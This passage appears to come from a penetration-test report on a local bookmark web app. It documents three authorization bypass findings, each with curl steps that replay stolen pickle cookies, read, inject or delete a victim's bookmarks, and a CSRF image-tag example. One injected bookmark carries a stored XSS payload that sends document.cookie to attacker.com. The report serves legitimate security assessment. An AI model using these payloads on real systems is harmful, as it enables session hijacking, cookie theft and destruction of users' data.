# Set-Cookie: bookmarks=gARdlC4=; Path=/
# Set-Cookie: user=d18aa6a7ea0f4f368a0816e073a66749; Path=/
```

4. **Attacker replays stolen victim cookies to access victim's bookmarks:**
```bash
# Attacker sets stolen cookies and views victim's data
curl -s \
  -b "user=d18aa6a7ea0f4f368a0816e073a66749; bookmarks=gASVawAAAAAAAABdlIwKYXBwLm1vZGVsc5SMBlVybE9iapSTlCmBlH2UKIwEbmFtZZSMDVNlY3JldFByb2plY3SUjAN1cmyUjCdodHRwOi8vaW50ZXJuYWwtY29tcGFueS1kb2NzLmNvbS9zZWNyZXSUdWJhLg==" \
  http://localhost:45971/list
```

**Proof of Impact:**
The response contains victim's private bookmark:
```html
<h5 class="mb-1">SecretProject</h5>
<a class="text-decoration-none" href="http://internal-company-docs.com/secret" target="_blank">
  http://internal-company-docs.com/secret
</a>
```

**Notes:**
- No server-side validation of cookie ownership (routes.py:37 - `pickle.loads(urls)` without authorization check)
- Cookies lack HttpOnly flag, making them accessible via JavaScript for XSS-based theft
- HTTP-only transport (no HTTPS) enables network-based cookie interception
- Attacker's own `user` cookie UUID is irrelevant - only the stolen `bookmarks` cookie matters

---

### AUTHZ-VULN-02: Horizontal Authorization Bypass on POST /add

**Summary:**
- **Vulnerable location:** POST /add endpoint (routes.py:59-63)
- **Overview:** Attacker can inject malicious bookmarks into victim's bookmark collection by manipulating stolen cookies
- **Impact:** Persistent XSS attack vector - attacker injects malicious JavaScript URLs that execute when victim clicks them, enabling further cookie theft and session hijacking
- **Severity:** HIGH

**Prerequisites:**
- Attacker must obtain victim's `bookmarks` and `user` cookies
- Victim must subsequently view their `/list` page where malicious bookmark is rendered

**Exploitation Steps:**

1. **Verify victim's current bookmarks:**
```bash
curl -s -b /tmp/victim_cookies.txt http://localhost:45971/list | \
  grep -E "<h5|href=\"http" | grep -v "delete"

# Output shows victim's existing bookmark:
# <h5 class="mb-1">SecretProject</h5>
# <a href="http://internal-company-docs.com/secret">...</a>
```

2. **Attacker steals victim's cookies and adds malicious bookmark:**
```bash
# Using stolen victim cookies, attacker posts malicious bookmark
curl -s \
  -b "user=7148219806674ff2baa2a402c9286eed; bookmarks=gASVawAAAAAAAABdlIwKYXBwLm1vZGVsc5SMBlVybE9iapSTlCmBlH2UKIwEbmFtZZSMDVNlY3JldFByb2plY3SUjAN1cmyUjCdodHRwOi8vaW50ZXJuYWwtY29tcGFueS1kb2NzLmNvbS9zZWNyZXSUdWJhLg==" \
  -c /tmp/modified_cookies.txt \
  -X POST \
  -d "name=AttackerMalicious&url=javascript:fetch('http://attacker.com/steal?c='+document.cookie)" \
  http://localhost:45971/add
```

3. **Verify malicious bookmark was injected into victim's collection:**
```bash
curl -s -b /tmp/modified_cookies.txt http://localhost:45971/list | \
  grep -E "<h5|href=\"" | grep -v "delete"

# Output now shows both legitimate and malicious bookmarks:
# <h5 class="mb-1">SecretProject</h5>
# <a href="http://internal-company-docs.com/secret">...</a>
# <h5 class="mb-1">AttackerMalicious</h5>
# <a href="javascript:fetch('http://attacker.com/steal?c=' document.cookie)">...</a>
```

**Proof of Impact:**
Victim's bookmark collection now contains attacker-controlled malicious entry:
```html
<h5 class="mb-1">AttackerMalicious</h5>
<a class="text-decoration-none"
   href="javascript:fetch('http://attacker.com/steal?c=' document.cookie)"
   target="_blank">
  javascript:fetch('http://attacker.com/steal?c=' document.cookie)
</a>
```

When victim clicks this bookmark, the JavaScript executes in their browser context, sending their cookies to `attacker.com`, enabling further exploitation.

**Notes:**
- No ownership validation at routes.py:59-63 (reads cookies → modifies → writes back without authorization)
- Combines authorization bypass with stored XSS vulnerability
- Application accepts `javascript:` protocol URLs without validation
- No CSRF protection on POST /add endpoint

---

### AUTHZ-VULN-03: Horizontal Authorization Bypass on GET /delete

**Summary:**
- **Vulnerable location:** GET /delete endpoint (routes.py:80-81)
- **Overview:** Attacker can delete victim's bookmarks by replaying stolen cookies with delete requests
- **Impact:** Data destruction - attacker can remove all of victim's bookmarks, causing data loss and denial of service
- **Severity:** HIGH

**Prerequisites:**
- Victim must have bookmarks to delete
- Attacker must obtain victim's `bookmarks` and `user` cookies
- Attacker must know or enumerate bookmark names (obtainable via AUTHZ-VULN-01)

**Exploitation Steps:**

1. **Create victim with important bookmark:**
```bash
# Initialize victim session
curl -s -c /tmp/victim2_cookies.txt http://localhost:45971/list

# Victim adds critical bookmark
curl -s \
  -b /tmp/victim2_cookies.txt \
  -c /tmp/victim2_cookies.txt \
  -X POST \
  -d "name=ImportantWork&url=http://critical-data.com/important" \
  http://localhost:45971/add

# Verify bookmark exists
curl -s -b /tmp/victim2_cookies.txt http://localhost:45971/list | \
  grep -E "<h5|href=\"http" | grep -v "delete"

# Output:
# <h5 class="mb-1">ImportantWork</h5>
# <a href="http://critical-data.com/important">...</a>
```

2. **Extract victim's cookies:**
```bash
cat /tmp/victim2_cookies.txt | grep -v "^#"

# Stolen cookies:
# bookmarks=gASVZgAAAAAAAABdlIwKYXBwLm1vZGVsc5SMBlVybE9iapSTlCmBlH2UKIwEbmFtZZSMDUltcG9ydGFudFdvcmuUjAN1cmyUjCJodHRwOi8vY3JpdGljYWwtZGF0YS5jb20vaW1wb3J0YW50lHViYS4=
# user=f31d4e862157417791ac9f880ba31ef5
```

3. **Attacker uses stolen cookies to delete victim's bookmark:**
```bash
# Attacker sends delete request with victim's cookies
curl -s \
  -b "user=f31d4e862157417791ac9f880ba31ef5; bookmarks=gASVZgAAAAAAAABdlIwKYXBwLm1vZGVsc5SMBlVybE9iapSTlCmBlH2UKIwEbmFtZZSMDUltcG9ydGFudFdvcmuUjAN1cmyUjCJodHRwOi8vY3JpdGljYWwtZGF0YS5jb20vaW1wb3J0YW50lHViYS4=" \
  "http://localhost:45971/delete?name=ImportantWork" \
  -c /tmp/after_delete.txt
```

4. **Verify victim's bookmark is deleted:**
```bash
curl -s -b /tmp/after_delete.txt http://localhost:45971/list | \
  grep -E "(No URLs added|<h5 class=\"mb-1\">)"

# Output:
# <h3 class="mb-4">No URLs added in your bookmark.</h3>
```

**Proof of Impact:**
Victim's bookmark "ImportantWork" has been permanently deleted from their collection. The `/list` page now shows "No URLs added in your bookmark." where previously the bookmark existed. This represents unauthorized data modification and destruction.

**Notes:**
- No ownership validation at routes.py:80-81 (deserializes cookies → deletes without authorization check)
- Uses GET method for state-changing operation (HTTP semantics violation)
- No CSRF protection - attacker could trigger deletion via image tag: `<img src="http://localhost:45971/delete?name=ImportantWork">`
- Attacker can chain with AUTHZ-VULN-01 to enumerate all bookmark names, then delete them systematically
